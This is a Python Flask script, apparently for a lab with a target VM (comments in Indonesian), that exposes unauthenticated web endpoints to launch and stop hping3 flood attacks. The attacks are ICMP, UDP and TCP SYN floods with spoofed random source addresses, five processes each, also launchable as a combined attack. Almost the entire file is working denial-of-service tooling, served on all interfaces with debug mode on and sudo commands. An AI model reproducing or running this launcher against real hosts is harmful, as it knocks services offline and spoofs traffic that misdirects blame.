from flask import Flask, jsonify
import subprocess
import os
import signal
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- KONFIGURASI ---
# Ganti dengan IP VM Target Anda
TARGET_IP = "192.168.0.118"
# ---------------------

# Global dictionary to track active attack processes
# Format: {"icmp": [pid1, pid2, ...], "udp": [...], "tcp": [...]}
active_attacks = {
    "icmp": [],
    "udp": [],
    "tcp": []
}

def start_attack_processes(attack_type, command, count=5):
    """
    Start multiple hping3 processes for an attack type.
    
    Args:
        attack_type: Type of attack (icmp, udp, tcp)
        command: Command to execute
        count: Number of processes to start (default: 5)
    
    Returns:
        dict: Status and message
    """
    try:
        # Check if hping3 is available
        if not os.path.exists("/usr/sbin/hping3") and not os.path.exists("/usr/bin/hping3"):
            return {"status": "error", "message": "hping3 not installed"}
        
        # Stop existing attacks of this type first
        stop_attack_processes(attack_type)
        
        # Start new processes
        pids = []
        for i in range(count):
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setpgrp  # Create new process group
            )
            pids.append(process.pid)
            logger.info(f"Started {attack_type} attack process {i+1}/{count} with PID {process.pid}")
        
        active_attacks[attack_type] = pids
        
        return {
            "status": "success",
            "message": f"{attack_type.upper()} attack started with {count} processes",
            "pids": pids
        }
    except Exception as e:
        logger.error(f"Error starting {attack_type} attack: {e}")
        return {"status": "error", "message": str(e)}

def stop_attack_processes(attack_type):
    """
    Stop all processes for a specific attack type.
    
    Args:
        attack_type: Type of attack (icmp, udp, tcp)
    
    Returns:
        dict: Status and message
    """
    try:
        pids = active_attacks.get(attack_type, [])
        
        if not pids:
            return {
                "status": "success",
                "message": f"No active {attack_type.upper()} attack to stop"
            }
        
        stopped_count = 0
        for pid in pids:
            try:
                os.kill(pid, signal.SIGTERM)
                stopped_count += 1
                logger.info(f"Stopped {attack_type} attack process with PID {pid}")
            except ProcessLookupError:
                logger.warning(f"Process {pid} already terminated")
            except Exception as e:
                logger.error(f"Error stopping process {pid}: {e}")
        
        active_attacks[attack_type] = []
        
        return {
            "status": "success",
            "message": f"Stopped {stopped_count} {attack_type.upper()} attack process(es)"
        }
    except Exception as e:
        logger.error(f"Error stopping {attack_type} attack: {e}")
        return {"status": "error", "message": str(e)}

@app.route('/attack/icmp/start')
def start_icmp_attack():
    """Start ICMP flood attack with 5 processes."""
    command = f"sudo hping3 --icmp --flood --rand-source {TARGET_IP}"
    result = start_attack_processes("icmp", command, 5)
    logger.info(f"ICMP attack start: {result}")
    return jsonify(result), 200 if result["status"] == "success" else 500

@app.route('/attack/icmp/stop')
def stop_icmp_attack():
    """Stop ICMP flood attack."""
    result = stop_attack_processes("icmp")
    logger.info(f"ICMP attack stop: {result}")
    return jsonify(result), 200

@app.route('/attack/udp/start')
def start_udp_attack():
    """Start UDP flood attack with 5 processes."""
    command = f"sudo hping3 --udp --flood --rand-source --rand-dest {TARGET_IP}"
    result = start_attack_processes("udp", command, 5)
    logger.info(f"UDP attack start: {result}")
    return jsonify(result), 200 if result["status"] == "success" else 500

@app.route('/attack/udp/stop')
def stop_udp_attack():
    """Stop UDP flood attack."""
    result = stop_attack_processes("udp")
    logger.info(f"UDP attack stop: {result}")
    return jsonify(result), 200

@app.route('/attack/tcp/start')
def start_tcp_attack():
    """Start TCP SYN flood attack to port 5201 with 5 processes."""
    command = f"sudo hping3 -S --flood --rand-source -p 5201 {TARGET_IP}"
    result = start_attack_processes("tcp", command, 5)
    logger.info(f"TCP attack start: {result}")
    return jsonify(result), 200 if result["status"] == "success" else 500

@app.route('/attack/tcp/stop')
def stop_tcp_attack():
    """Stop TCP SYN flood attack."""
    result = stop_attack_processes("tcp")
    logger.info(f"TCP attack stop: {result}")
    return jsonify(result), 200

@app.route('/attack/combined/start')
def start_combined_attack():
    """Start all three attacks (ICMP, UDP, TCP) - 15 processes total."""
    results = {}
    
    # Start ICMP
    icmp_cmd = f"sudo hping3 --icmp --flood --rand-source {TARGET_IP}"
    results["icmp"] = start_attack_processes("icmp", icmp_cmd, 5)
    
    # Start UDP
    udp_cmd = f"sudo hping3 --udp --flood --rand-source --rand-dest {TARGET_IP}"
    results["udp"] = start_attack_processes("udp", udp_cmd, 5)
    
    # Start TCP
    tcp_cmd = f"sudo hping3 -S --flood --rand-source -p 5201 {TARGET_IP}"
    results["tcp"] = start_attack_processes("tcp", tcp_cmd, 5)
    
    logger.info(f"Combined attack start: {results}")
    
    return jsonify({
        "status": "success",
        "message": "Combined attack started (ICMP + UDP + TCP)",
        "details": results
    }), 200

@app.route('/attack/combined/stop')
def stop_combined_attack():
    """Stop all attacks."""
    results = {}
    
    results["icmp"] = stop_attack_processes("icmp")
    results["udp"] = stop_attack_processes("udp")
    results["tcp"] = stop_attack_processes("tcp")
    
    logger.info(f"Combined attack stop: {results}")
    
    return jsonify({
        "status": "success",
        "message": "All attacks stopped",
        "details": results
    }), 200

@app.route('/attack/status')
def get_attack_status():
    """Return JSON with currently active attacks."""
    # Clean up PIDs of dead processes
    for attack_type in active_attacks:
        active_pids = []
        for pid in active_attacks[attack_type]:
            try:
                # Check if process is still alive
                os.kill(pid, 0)
                active_pids.append(pid)
            except ProcessLookupError:
                # Process is dead
                pass
        active_attacks[attack_type] = active_pids
    
    status = {
        "icmp": {
            "active": len(active_attacks["icmp"]) > 0,
            "process_count": len(active_attacks["icmp"]),
            "pids": active_attacks["icmp"]
        },
        "udp": {
            "active": len(active_attacks["udp"]) > 0,
            "process_count": len(active_attacks["udp"]),
            "pids": active_attacks["udp"]
        },
        "tcp": {
            "active": len(active_attacks["tcp"]) > 0,
            "process_count": len(active_attacks["tcp"]),
            "pids": active_attacks["tcp"]
        }
    }
    
    return jsonify(status), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002, debug=True)
